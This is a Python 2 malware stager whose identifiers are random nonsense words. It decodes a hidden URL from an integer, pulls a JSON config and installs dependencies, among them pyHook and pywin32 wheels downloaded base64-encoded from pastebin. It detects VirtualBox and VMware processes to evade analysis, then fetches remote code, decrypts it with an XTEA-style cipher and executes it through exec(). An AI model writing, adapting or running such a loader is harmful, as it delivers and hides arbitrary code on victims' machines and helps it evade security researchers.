from __future__ import print_function
import os
import sys
import imp
import json
import struct
import base64
import urllib

 
_debug = True


def main(*args, **kwargs):
    
    def QuadraticFungalLegend(data, key):
        data    = base64.b64decode(data)
        blocks  = [data[i * 8:((i + 1) * 8)] for i in range(len(data) // 8)]
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            u,v = struct.unpack("!2L", block)
            k   = struct.unpack("!4L", key)
            d,m = 0x9e3779b9L, 0xffffffffL
            sum = (d * 32) & m
            for _ in range(32):
                v   = (v - (((u << 4 ^ u >> 5) + u) ^ (sum + k[sum >> 11 & 3]))) & m
                sum = (sum - d) & m
                u   = (u - (((v << 4 ^ v >> 5) + v) ^ (sum + k[sum & 3]))) & m
            packed  = struct.pack("!2L", u, v)
            output  = "".join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, packed))
            vector  = block
            result.append(output)
        return ''.join(result).rstrip(chr(0))
        
    def CrystallineSluggishAnatomy(*args, **kwargs):
        IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
        SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
        RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
        SeamlessGalacticSponges   = lambda x: print(str(x)) if _debug else ''
        AccidentalAquaticCat      = json.loads(urllib.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
        AccidentalAquaticCat['f'] = bytes(IncontinentObtuseCucumber(__file__))
        GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
        if not len(GroovySophisticatedLemur):
            if os.name is 'nt':
                if os.path.exists('/Python27/Scripts/pip.exe'):
                    GroovySophisticatedLemur = '/Python27/Scripts/pip.exe' 
            else:
                if os.path.exists('/usr/bin/pip'):
                    GroovySophisticatedLemur = '/usr/bin/pip'
                elif os.path.exists('/usr/local/bin/pip'):
                    GroovySophisticatedLemur = '/usr/local/bin/pip'
            exec urllib.urlopen("https://bootstrap.pypa.io/get-pip.py").read() in globals()
            return SomberUnbecomingAmusement(AccidentalAquaticCat.get('l'))
        else:
            try:
                os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
                OrganicFecalOrigin = json.loads(urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat['t'])).read()).get(os.name).get(str(struct.calcsize('P') * 8))
                for FoamyNonstopHistory, NobleRusticWalrus in OrganicFecalOrigin.items():
                    if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                        RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                        if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                            if 'pastebin' not in NobleRusticWalrus:
                                RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
                            else:
                                if 'pyHook' in FoamyNonstopHistory:
                                    ZonkedEnthusiasticTadpole = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
                                    with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                        fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                                    if os.path.isfile(ZonkedEnthusiasticTadpole):
                                        os.remove(ZonkedEnthusiasticTadpole)
                                elif 'pypiwin32' in FoamyNonstopHistory:
                                    ZonkedEnthusiasticTadpole = 'pywin32-221-cp27-cp27m-win_amd64.whl'
                                    with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                        fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                                    SilkyPerilousManifesto  = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
                                    if os.path.isfile(SilkyPerilousManifesto):
                                        RuthlessSpiffyTablecloth([SilkyPerilousManifesto, '-install'])
                                    if os.path.isfile(ZonkedEnthusiasticTadpole):
                                        os.remove(ZonkedEnthusiasticTadpole)
                                elif 'pycrypto' in FoamyNonstopHistory:
                                    ZonkedEnthusiasticTadpole = 'pycrypto-2.6.1-cp27-none-win_amd64.whl'
                                    with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
                                        fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
                                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
                                    if os.path.isfile(ZonkedEnthusiasticTadpole):
                                        os.remove(ZonkedEnthusiasticTadpole)
                                else:
                                    SeamlessGalacticSponges('{"{}": "{}"} was not loaded'.format(ZonkedEnthusiasticTadpole, NobleRusticWalrus))
            except Exception as e:
                if _debug:
                    print("Launch error: {}".format(str(e)))
            finally:
                AccidentalAquaticCat['v'] = '00000000000000000000'
                return AccidentalAquaticCat                
                
    s = 'tasklist' if os.name is 'nt' else 'ps'
    c = 0 if os.name is 'nt' else -1
    
    if kwargs.get('checkvm'):
        check_environ = [_ for _ in os.environ.keys() if 'VBOX' in _.upper()]
        check_procs   = [i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
        if len(check_environ + check_procs):
            if _debug:
                print("\n\tVirtual Machine detected\n")
                if len(check_environ):
                    print("\nEnvironment variables:\n\t{}\n".format(', '.join(["{}".format(i) for i in check_environ])))
                if len(check_procs):
                    print("\nRunning processes:\n\t{}\n".format(', '.join(["{}".format(i) for i in check_procs])))
            else:
                if os.name is 'nt':
                    return 'taskkill /f %d' % os.getpid()
                else:
                    return 'kill -9 %d' % os.getpid()

    if 'config' in kwargs:
        AccidentalAquaticCat        = CrystallineSluggishAnatomy(**kwargs)
        SomberUnbecomingAmusement   = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241%s' % x)).strip('0x').strip('L')))
        pkgs     = 'from __future__ import print_function\n'
        if 'z' in AccidentalAquaticCat:
            head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
            head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
            foot = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read()
            foot = base64.b64decode(foot)
            body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
            body = QuadraticFungalLegend(body, foot)
            pkgs = pkgs + urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
        else:
            head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
            head = head + "\n\nif __name__ == '__main__':\n\tmain(**{})".format(json.dumps(AccidentalAquaticCat))
            body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
            pkgs = pkgs + urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
        return (pkgs, body, head)


if __name__ == '__main__':
    try:
        header, body, footer = main(checkvm=True, config=81126388790932157784)
        code = '\n\n\n'.join([header, body, footer])
        exec(code)
    except Exception as e:
        if _debug:
            print("Error: {}".format(str(e)))
            
